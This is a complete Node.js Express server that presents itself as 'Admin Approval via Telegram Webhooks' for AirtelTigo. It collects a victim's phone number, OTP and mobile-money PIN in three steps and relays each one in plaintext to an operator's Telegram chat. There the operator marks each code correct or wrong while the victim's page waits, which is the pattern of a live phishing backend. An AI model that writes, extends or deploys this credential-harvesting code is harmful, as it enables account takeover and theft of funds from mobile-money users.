// airteltigo-server.js - Admin Approval via Telegram Webhooks
// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
// Uses Telegram webhooks instead of long-polling.
// Benefits on Render:
//   • Zero 409 conflicts — no competing getUpdates connections
//   • Zero reconnect logic — Telegram pushes to us, we never pull
//   • Zero polling errors in logs
//   • Lower latency (<100ms vs ~1s for polling round-trip)
//   • Lower CPU/memory — no persistent outbound connection
//
// Required env vars:
//   WEBHOOK_URL=https://your-service.onrender.com
//
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto      = require('crypto');
const https       = require('https');
require('dotenv').config();

const app  = express();
const PORT = process.env.PORT || 3001;

// Raw body needed for webhook signature verification — must come before json()
app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ─── CONFIG ────────────────────────────────────────────────────────────────
const CFG = Object.freeze({
  APPROVAL_TIMEOUT:  5 * 60_000,
  CLEANUP_INTERVAL:  15_000,
  MAX_USERS:         parseInt(process.env.MAX_USERS) || 1,
  TG_CHAT_INTERVAL:  1_050,       // ms — Telegram: 1 msg/s per chat
  MAX_MSG_SIZE:      4_096,
  SSE_HEARTBEAT:     20_000,
  SEND_RETRIES:      3,
  SEND_RETRY_DELAY:  1_500,
  DUPE_TTL:          5_000,
  WEBHOOK_URL:       (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
});

// ─── LOGGER ────────────────────────────────────────────────────────────────
const ts     = () => new Date().toISOString();
const logger = {
  info:  (m, ...a) => console.log (`[INFO]  ${ts()} ${m}`, ...a),
  warn:  (m, ...a) => console.warn (`[WARN]  ${ts()} ${m}`, ...a),
  error: (m, ...a) => console.error(`[ERROR] ${ts()} ${m}`, ...a),
  debug: (m, ...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${m}`, ...a),
};

// ─── HELPERS ───────────────────────────────────────────────────────────────
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s ?? ''));
const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n - 3) + '...';
const sleep    = (ms) => new Promise(r => setTimeout(r, ms));

// ─── O(1) DUPE CACHE ───────────────────────────────────────────────────────
class DupeCache {
  constructor(ttl = CFG.DUPE_TTL) { this._m = new Map(); this._ttl = ttl; }
  seen(key) {
    if (this._m.has(key)) return true;
    const h = setTimeout(() => this._m.delete(key), this._ttl);
    if (h.unref) h.unref();
    this._m.set(key, h);
    return false;
  }
  clear() { for (const h of this._m.values()) clearTimeout(h); this._m.clear(); }
}

// ─── PER-USER TELEGRAM SEND QUEUE ──────────────────────────────────────────
class TgQueue {
  constructor(interval = CFG.TG_CHAT_INTERVAL) {
    this._q        = [];
    this._running  = false;
    this._interval = interval;
    this._last     = 0;
  }
  send(fn) {
    return new Promise((resolve, reject) => {
      this._q.push({ fn, resolve, reject });
      if (!this._running) this._drain();
    });
  }
  async _drain() {
    this._running = true;
    while (this._q.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, resolve, reject } = this._q.shift();
      this._last = Date.now();
      try   { resolve(await fn()); }
      catch (e) { reject(e); }
    }
    this._running = false;
  }
  flush(reason = 'queue flushed') {
    while (this._q.length) this._q.shift().reject(new Error(reason));
  }
}

// ─── SSE BROKER ────────────────────────────────────────────────────────────
class SseBroker {
  constructor() { this._subs = new Map(); }
  subscribe(key, res) {
    res.setHeader('Content-Type',      'text/event-stream');
    res.setHeader('Cache-Control',     'no-cache');
    res.setHeader('Connection',        'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();
    const hb    = setInterval(() => { if (!res.writableEnded) res.write(': ping\n\n'); }, CFG.SSE_HEARTBEAT);
    const entry = { res, hb };
    if (!this._subs.has(key)) this._subs.set(key, new Set());
    this._subs.get(key).add(entry);
    const unsub = () => {
      clearInterval(hb);
      const s = this._subs.get(key);
      if (s) { s.delete(entry); if (!s.size) this._subs.delete(key); }
      if (!res.writableEnded) res.end();
    };
    res.on('close', unsub);
    res.on('error', unsub);
  }
  push(key, payload) {
    const set = this._subs.get(key);
    if (!set?.size) return;
    const data = `data: ${JSON.stringify(payload)}\n\n`;
    for (const { res, hb } of set) {
      clearInterval(hb);
      if (!res.writableEnded) { res.write(data); res.end(); }
    }
    this._subs.delete(key);
  }
  get size() { let n = 0; for (const s of this._subs.values()) n += s.size; return n; }
}
const sseBroker = new SseBroker();

// ─── VALIDATORS ────────────────────────────────────────────────────────────
const validatePhoneNumber = (phoneNumber) => {
  if (!phoneNumber || typeof phoneNumber !== 'string') {
    return { valid: false };
  }
  const cleaned = phoneNumber.replace(/\D/g, '');
  return { valid: cleaned.length >= 9 && cleaned.length <= 10 };
};

const validatePin = (pin) => {
  if (!pin || typeof pin !== 'string') {
    return { valid: false };
  }
  return { valid: pin.length === 4 && /^\d+$/.test(pin) };
};

const validateOtp = (otp) => {
  if (!otp || typeof otp !== 'string') {
    return { valid: false };
  }
  return { valid: otp.length === 4 && /^\d+$/.test(otp) };
};

// ─── CALLBACK DATA ─────────────────────────────────────────────────────────
const CB_SEP  = '|';
const mkCb    = (type, action, phone) => [type, action, phone].join(CB_SEP);
const parseCb = (d) => {
  const p = d.split(CB_SEP);
  return p.length === 3 ? { type: p[0], action: p[1], phone: p[2] } : null;
};

// ─── VERSION-SAFE TELEGRAM WEBHOOK HELPERS ────────────────────────────────
const _rawTgCall = (token, method, body = {}) => new Promise((resolve, reject) => {
  const data = JSON.stringify(body);
  const req  = https.request({
    hostname: 'api.telegram.org',
    path:     `/bot${token}/${method}`,
    method:   'POST',
    headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
  }, (res) => {
    let raw = '';
    res.on('data', c => raw += c);
    res.on('end', () => {
      try {
        const parsed = JSON.parse(raw);
        if (parsed.ok) resolve(parsed.result);
        else reject(new Error(`Telegram error: ${parsed.description}`));
      } catch (e) { reject(e); }
    });
  });
  req.on('error', reject);
  req.write(data);
  req.end();
});

const tgDeleteWebhook  = (bot, token) =>
  (bot.deleteWebhook?.() ?? _rawTgCall(token, 'deleteWebhook', { drop_pending_updates: true }));

const tgSetWebhook = (bot, token, url, opts = {}) =>
  (bot.setWebhook?.(url, opts) ?? _rawTgCall(token, 'setWebhook', { url, ...opts }));

const tgGetWebhookInfo = (bot, token) =>
  (bot.getWebhookInfo?.() ?? _rawTgCall(token, 'getWebhookInfo', {}));

// ─── BOT MANAGER (webhook edition) ─────────────────────────────────────────
class BotManager {
  constructor(user, link) {
    this.user   = user;
    this.link   = link;
    this.bot    = null;
    this.ready  = false;
  }

  get _secret() {
    return crypto.createHash('sha256')
      .update(`wh:${this.user.botToken}`)
      .digest('hex')
      .slice(0, 32);
  }

  get _path() { return `/telegram/${this._secret}`; }

  async init() {
    if (!CFG.WEBHOOK_URL) {
      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
      return;
    }

    this.bot = new TelegramBot(this.user.botToken, {
      webHook: false,
      filepath: false,
    });

    this._attachCommands();

    const fullUrl = `${CFG.WEBHOOK_URL}${this._path}`;

    try {
      await tgDeleteWebhook(this.bot, this.user.botToken).catch(() => {});

      await tgSetWebhook(this.bot, this.user.botToken, fullUrl, {
        allowed_updates: ['message', 'callback_query'],
        drop_pending_updates: true,
      });

      const info = await tgGetWebhookInfo(this.bot, this.user.botToken).catch(() => ({}));
      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);
      logger.debug(`${this.user.name}: pending=${info?.pending_update_count ?? '?'}, lastErr=${info?.last_error_message || 'none'}`);

      this.user.healthy = true;
      this.user.bot     = this.bot;
      this.ready        = true;
    } catch (e) {
      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
    }
  }

  processUpdate(update) {
    if (!this.bot) return;
    try { this.bot.processUpdate(update); }
    catch (e) { logger.error(`${this.user.name}: processUpdate error:`, e.message); }
  }

  _attachCommands() {
    const { bot, user, link } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🤖 <b>${sanitize(user.name)} Bot</b>\n\n` +
          `I will notify you of all verification attempts.\n\n` +
          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Endpoint:</b> <code>/api/${link}/*</code>`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/start:', e.message); }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        const info = await tgGetWebhookInfo(bot, user.botToken).catch(() => null);
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
          `📊 Pending phones: ${user.phoneApprovals.size}\n` +
          `📊 Pending OTPs:   ${user.otpApprovals.size}\n` +
          `📊 Pending PINs:   ${user.pinApprovals.size}\n` +
          `✅ Verified:       ${user.verifiedUsers.size}\n` +
          `📡 SSE clients:    ${sseBroker.size}\n` +
          `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
          `🌐 Webhook: <code>${info?.url || 'unknown'}</code>\n` +
          `${info?.last_error_message ? `⚠️ Last error: ${info.last_error_message}` : '✅ No errors'}\n` +
          `${user.lastErr ? `⚠️ Last send error: ${sanitize(user.lastErr)}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error('/status:', e.message); }
    });

    bot.on('callback_query', async (q) => {
      try { await handleCallback(user, q); }
      catch (e) { logger.error(`${user.name}: callback error:`, e.message); }
    });
  }

  ok() { return this.ready && this.user.healthy; }
}

// ─── CALLBACK HANDLER ──────────────────────────────────────────────────────
const _answeredCallbacks = new Set();

async function handleCallback(user, q) {
  const { bot } = user;
  const { data, message: msg, id: qid } = q;
  const { chat: { id: chatId }, message_id: mid } = msg;

  if (_answeredCallbacks.has(qid)) return;
  _answeredCallbacks.add(qid);
  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60_000);
  if (t.unref) t.unref();

  const edit = (text) =>
    bot.editMessageText(text, {
      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [] },
    }).catch(e => logger.debug('edit skipped:', e.message));

  const answer = (text, alert = false) =>
    bot.answerCallbackQuery(qid, { text, show_alert: alert })
      .catch(e => logger.debug('answer skipped:', e.message));

  const parsed = parseCb(data);
  if (!parsed) { await answer('❌ Bad data', true); return; }

  const { type, action, phone } = parsed;
  const now = Date.now();

  if (type === 'phone') {
    const approval = user.phoneApprovals.get(phone);
    if (!approval) {
      await answer('❌ Session expired', true);
      return;
    }

    if (approval.status) {
      await answer('✅ Already processed');
      return;
    }

    if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      approval.status = 'timeout';
      sseBroker.push(`phone:${phone}`, { status: 'timeout' });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📱 <code>${phone}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }

    approval.status = action;

    const messages = {
      allow: `✅ <b>ALLOWED</b>\n📱 <code>${phone}</code>\n\n→ Proceeding to OTP`,
      invalid: `❌ <b>INVALID</b>\n📱 <code>${phone}</code>\n\n❌ Phone not eligible`
    };

    sseBroker.push(`phone:${phone}`, { status: action });
    await Promise.all([
      edit(messages[action] || ''),
      answer(action === 'allow' ? '✅ Allowed!' : '❌ Marked invalid'),
    ]);
    return;
  }

  if (type === 'otp') {
    const approval = user.otpApprovals.get(phone);
    if (!approval) {
      await answer('❌ Session expired', true);
      return;
    }

    if (approval.status) {
      await answer('✅ Already processed');
      return;
    }

    if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      approval.status = 'timeout';
      sseBroker.push(`otp:${phone}`, { status: 'timeout' });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📱 <code>${phone}</code>\n🔑 <code>${approval.otp}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }

    approval.status = action;

    const messages = {
      correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n→ Proceeding to PIN`,
      wrong: `❌ <b>WRONG</b>\n📱 <code>${phone}</code>\n\n❌ OTP incorrect`
    };

    sseBroker.push(`otp:${phone}`, { status: action });
    await Promise.all([
      edit(messages[action] || ''),
      answer(action === 'correct' ? '✅ Verified!' : '❌ Wrong OTP'),
    ]);
    return;
  }

  if (type === 'pin') {
    const approval = user.pinApprovals.get(phone);
    if (!approval) {
      await answer('❌ Session expired', true);
      return;
    }

    if (approval.status) {
      await answer('✅ Already processed');
      return;
    }

    if (now - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      approval.status = 'timeout';
      sseBroker.push(`pin:${phone}`, { status: 'timeout' });
      await Promise.all([
        edit(`⏰ <b>EXPIRED</b>\n📱 <code>${phone}</code>\n🔐 <code>${approval.pin}</code>`),
        answer('⏰ Session expired', true),
      ]);
      return;
    }

    approval.status = action;

    if (action === 'correct') {
      user.verifiedUsers.add(phone);
    }

    const messages = {
      correct: `✅ <b>CORRECT</b>\n📱 <code>${phone}</code>\n\n✅ USER AUTHENTICATED`,
      wrong: `❌ <b>WRONG</b>\n📱 <code>${phone}</code>\n\n❌ PIN incorrect`
    };

    sseBroker.push(`pin:${phone}`, { status: action });
    await Promise.all([
      edit(messages[action] || ''),
      answer(action === 'correct' ? '✅ Authenticated!' : '❌ Wrong PIN'),
    ]);
    return;
  }

  await answer('❓ Unknown type');
}

// ─── SEND TELEGRAM MESSAGE ─────────────────────────────────────────────────
async function sendMsg(user, text, opts = {}) {
  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
  return user.tgQueue.send(async () => {
    let attempt = 0;
    while (true) {
      try {
        await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
        user.lastErr = null;
        return { ok: true };
      } catch (e) {
        user.lastErr = e.message;
        const s = e.response?.statusCode;
        logger.error(`sendMsg [${user.name}] attempt ${attempt + 1}:`, s || e.code, e.message);
        if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
        if (s === 429) {
          const wait = Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60_000);
          await sleep(wait);
          continue;
        }
        if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; }
        return { ok: false, err: e.message };
      }
    }
  });
}

// ─── LOAD USERS ────────────────────────────────────────────────────────────
const users = new Map();

(function loadUsers() {
  let ok = 0, fail = 0;
  for (let i = 1; i <= CFG.MAX_USERS; i++) {
    const link   = process.env[`USER_LINK_INSERT_${i}`];
    const token  = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
    const name   = process.env[`USER_NAME_${i}`] || `User ${i}`;
    if (!link || !token || !chatId) continue;
    if (!/^[a-zA-Z0-9_-]+$/.test(link))     { logger.warn(`User ${i}: bad link`);   fail++; continue; }
    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`);  fail++; continue; }
    if (!/^-?\d+$/.test(chatId))              { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
    if (users.has(link))                      { logger.warn(`Dup link: ${link}`);     fail++; continue; }
    const u = {
      id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
      bot: null, healthy: false, lastErr: null,
      phoneApprovals: new Map(),
      otpApprovals: new Map(),
      pinApprovals: new Map(),
      verifiedUsers: new Set(),
      dupes: new DupeCache(),
      tgQueue: new TgQueue(),
    };
    u.mgr = new BotManager(u, link);
    users.set(link, u);
    ok++;
  }
  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
})();

// ─── WEBHOOK ROUTES ─────────────────────────────────────────────────────────
users.forEach((user) => {
  const path = user.mgr._path;
  app.post(path, (req, res) => {
    res.sendStatus(200);
    let update;
    try {
      const body = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : JSON.stringify(req.body);
      update = JSON.parse(body);
    } catch (e) {
      logger.error(`${user.name}: webhook body parse error:`, e.message);
      return;
    }
    user.mgr.processUpdate(update);
  });
  logger.debug(`Registered webhook route: POST ${path} → ${user.name}`);
});

// ─── BOT INIT ──────────────────────────────────────────────────────────────
(async () => {
  if (!CFG.WEBHOOK_URL) {
    logger.error('WEBHOOK_URL env var is not set. Add it to your Render environment variables:');
    logger.error('  WEBHOOK_URL=https://your-service.onrender.com');
    logger.error('Bots will not receive updates until this is set.');
  }
  const arr = [...users.values()];
  for (let i = 0; i < arr.length; i++) {
    try   { await arr[i].mgr.init(); }
    catch (e) { logger.error(`Init [${arr[i].name}]:`, e.message); }
    if (i < arr.length - 1) await sleep(500);
  }
  logger.info('All bots initialised');
})();

// ─── GC ────────────────────────────────────────────────────────────────────
setInterval(() => {
  const now    = Date.now();
  const expire = now - CFG.APPROVAL_TIMEOUT;
  const purge  = now - 10 * 60_000;
  for (const u of users.values()) {
    for (const [k, v] of u.phoneApprovals) {
      if (!v.status && v.timestamp < expire) {
        v.status = 'timeout';
        sseBroker.push(`phone:${k}`, { status: 'timeout' });
      }
      if (v.timestamp < purge) u.phoneApprovals.delete(k);
    }
    for (const [k, v] of u.otpApprovals) {
      if (!v.status && v.timestamp < expire) {
        v.status = 'timeout';
        sseBroker.push(`otp:${k}`, { status: 'timeout' });
      }
      if (v.timestamp < purge) u.otpApprovals.delete(k);
    }
    for (const [k, v] of u.pinApprovals) {
      if (!v.status && v.timestamp < expire) {
        v.status = 'timeout';
        sseBroker.push(`pin:${k}`, { status: 'timeout' });
      }
      if (v.timestamp < purge) u.pinApprovals.delete(k);
    }
  }
}, CFG.CLEANUP_INTERVAL).unref?.();

// ─── ROUTE HELPERS ────────────────────────────────────────────────────────
const botOk = (u, res) => {
  if (!u.bot || !u.healthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; }
  return true;
};

// ─── HEALTH ────────────────────────────────────────────────────────────────
app.get('/api/health', (_, res) => {
  const list = [...users.values()].map(u => ({
    name: u.name, link: u.linkInsert, healthy: u.healthy, active: !!u.bot,
    phones: u.phoneApprovals.size, otps: u.otpApprovals.size, pins: u.pinApprovals.size,
    verified: u.verifiedUsers.size, sse: sseBroker.size, lastErr: u.lastErr,
    webhookPath: u.mgr._path,
  }));
  res.json({ status: list.some(u => u.healthy) ? 'ok' : 'degraded', users: list, ts: ts() });
});

// ─── DYNAMIC ROUTES ────────────────────────────────────────────────────────
users.forEach((user, link) => {
  const R = `/api/${link}`;

  // ───────────────────────────────────────────
  // STEP 1: VERIFY PHONE
  // ───────────────────────────────────────────
  app.post(`${R}/verify-phone`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { phoneNumber } = req.body;
    
    if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
      return res.json({ 
        success: true,
        status: 'invalid',
        message: 'Invalid phone format'
      });
    }

    if (user.dupes.seen(`phone:${phoneNumber}`)) {
      return res.json({ success: true, status: 'pending', message: 'Cached' });
    }

    user.phoneApprovals.set(phoneNumber, { timestamp: Date.now(), status: null });

    const text = `📱 <b>${sanitize(user.name)} — Phone Verification</b>\n\n` +
                 `📱 Phone: <code>${phoneNumber}</code>\n` +
                 `⏰ ${new Date().toLocaleString()}\n\n` +
                 `⚠️ <b>Waiting for approval...</b>`;

    const keyboard = { inline_keyboard: [
      [{ text: '✅ Allow', callback_data: mkCb('phone', 'allow', phoneNumber) }],
      [{ text: '❌ Invalid', callback_data: mkCb('phone', 'invalid', phoneNumber) }]
    ]};

    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, status: 'pending', message: 'Phone sent for verification' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // ───────────────────────────────────────────
  // CHECK PHONE STATUS
  // ───────────────────────────────────────────
  app.post(`${R}/check-phone-status`, (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ success: false, message: 'Phone required' });
    }

    const approval = user.phoneApprovals.get(phoneNumber);
    if (!approval) {
      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
    }

    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
    }

    if (approval.status === 'allow') {
      return res.json({ success: true, status: 'allow', message: 'Phone allowed' });
    } else if (approval.status === 'invalid') {
      return res.json({ success: true, status: 'invalid', message: 'Phone marked as invalid' });
    } else {
      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
    }
  });

  // ───────────────────────────────────────────
  // STREAM PHONE STATUS (SSE)
  // ───────────────────────────────────────────
  app.get(`${R}/stream-phone-status`, (req, res) => {
    const { phone } = req.query;
    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
    const approval = user.phoneApprovals.get(phone);
    if (approval && approval.status) {
      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`phone:${phone}`, res);
  });

  // ───────────────────────────────────────────
  // STEP 2: VERIFY OTP
  // ───────────────────────────────────────────
  app.post(`${R}/verify-otp`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { phoneNumber, otp } = req.body;
    
    if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
      return res.json({ success: true, status: 'wrong', message: 'Invalid phone' });
    }

    if (!otp || !validateOtp(otp).valid) {
      return res.json({ success: true, status: 'wrong', message: 'Invalid OTP' });
    }

    if (user.dupes.seen(`otp:${phoneNumber}:${otp}`)) {
      return res.json({ success: true, status: 'pending', message: 'Cached' });
    }

    user.otpApprovals.set(phoneNumber, { timestamp: Date.now(), status: null, otp });

    const text = `✅ <b>${sanitize(user.name)} — OTP Verification</b>\n\n` +
                 `📱 Phone: <code>${phoneNumber}</code>\n` +
                 `🔐 OTP: <code>${otp}</code>\n` +
                 `⏰ ${new Date().toLocaleString()}\n\n` +
                 `⚠️ <b>Is OTP correct?</b>`;

    const keyboard = { inline_keyboard: [
      [{ text: '✅ Correct', callback_data: mkCb('otp', 'correct', phoneNumber) }],
      [{ text: '❌ Wrong', callback_data: mkCb('otp', 'wrong', phoneNumber) }]
    ]};

    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, status: 'pending', message: 'OTP sent for verification' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // ───────────────────────────────────────────
  // CHECK OTP STATUS
  // ───────────────────────────────────────────
  app.post(`${R}/check-otp-status`, (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ success: false, message: 'Phone required' });
    }

    const approval = user.otpApprovals.get(phoneNumber);
    if (!approval) {
      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
    }

    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
    }

    if (approval.status === 'correct') {
      return res.json({ success: true, status: 'correct', message: 'OTP is correct' });
    } else if (approval.status === 'wrong') {
      return res.json({ success: true, status: 'wrong', message: 'OTP is wrong' });
    } else {
      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
    }
  });

  // ───────────────────────────────────────────
  // STREAM OTP STATUS (SSE)
  // ───────────────────────────────────────────
  app.get(`${R}/stream-otp-status`, (req, res) => {
    const { phone } = req.query;
    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
    const approval = user.otpApprovals.get(phone);
    if (approval && approval.status) {
      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`otp:${phone}`, res);
  });

  // ───────────────────────────────────────────
  // STEP 3: VERIFY PIN
  // ───────────────────────────────────────────
  app.post(`${R}/verify-pin`, async (req, res) => {
    if (!botOk(user, res)) return;
    const { phoneNumber, pin } = req.body;
    
    if (!phoneNumber || !validatePhoneNumber(phoneNumber).valid) {
      return res.json({ success: true, status: 'wrong', message: 'Invalid phone' });
    }

    if (!pin || !validatePin(pin).valid) {
      return res.json({ success: true, status: 'wrong', message: 'Invalid PIN' });
    }

    if (user.dupes.seen(`pin:${phoneNumber}:${pin}`)) {
      return res.json({ success: true, status: 'pending', message: 'Cached' });
    }

    user.pinApprovals.set(phoneNumber, { timestamp: Date.now(), status: null, pin });

    const text = `🔐 <b>${sanitize(user.name)} — PIN Verification</b>\n\n` +
                 `📱 Phone: <code>${phoneNumber}</code>\n` +
                 `🔑 PIN: <code>${pin}</code>\n` +
                 `⏰ ${new Date().toLocaleString()}\n\n` +
                 `⚠️ <b>Is PIN correct?</b>`;

    const keyboard = { inline_keyboard: [
      [{ text: '✅ Correct', callback_data: mkCb('pin', 'correct', phoneNumber) }],
      [{ text: '❌ Wrong', callback_data: mkCb('pin', 'wrong', phoneNumber) }]
    ]};

    const r = await sendMsg(user, text, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, status: 'pending', message: 'PIN sent for verification' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // ───────────────────────────────────────────
  // CHECK PIN STATUS
  // ───────────────────────────────────────────
  app.post(`${R}/check-pin-status`, (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ success: false, message: 'Phone required' });
    }

    const approval = user.pinApprovals.get(phoneNumber);
    if (!approval) {
      return res.json({ success: true, status: 'pending', message: 'Waiting for verification' });
    }

    if (Date.now() - approval.timestamp > CFG.APPROVAL_TIMEOUT) {
      return res.json({ success: true, status: 'timeout', message: 'Session expired' });
    }

    if (approval.status === 'correct') {
      return res.json({ success: true, status: 'correct', message: 'PIN is correct' });
    } else if (approval.status === 'wrong') {
      return res.json({ success: true, status: 'wrong', message: 'PIN is wrong' });
    } else {
      return res.json({ success: true, status: 'pending', message: 'Waiting for admin decision' });
    }
  });

  // ───────────────────────────────────────────
  // STREAM PIN STATUS (SSE)
  // ───────────────────────────────────────────
  app.get(`${R}/stream-pin-status`, (req, res) => {
    const { phone } = req.query;
    if (!phone) return res.status(400).json({ success: false, message: 'Phone required' });
    const approval = user.pinApprovals.get(phone);
    if (approval && approval.status) {
      res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
      res.write(`data: ${JSON.stringify({ status: approval.status })}\n\n`);
      return res.end();
    }
    sseBroker.subscribe(`pin:${phone}`, res);
  });
});

// ─── 404 + ERROR ──────────────────────────────────────────────────────────
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, _next) => {
  logger.error('Unhandled Express error:', err.message);
  res.status(500).json({ success: false, error: 'Internal server error' });
});

// ─── GRACEFUL SHUTDOWN ────────────────────────────────────────────────────
const shutdown = async (sig) => {
  logger.info(`${sig} — shutting down`);
  server.close();
  for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutting down'); }
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException',  (e) => logger.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));

// ─── START ────────────────────────────────────────────────────────────────
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🤖 Airteltigo Webhook Server`);
  console.log(`🚀 Port: ${PORT}`);
  console.log(`🌐 Webhook base: ${CFG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
  console.log(`👥 Users: ${users.size}/${CFG.MAX_USERS}`);
  users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});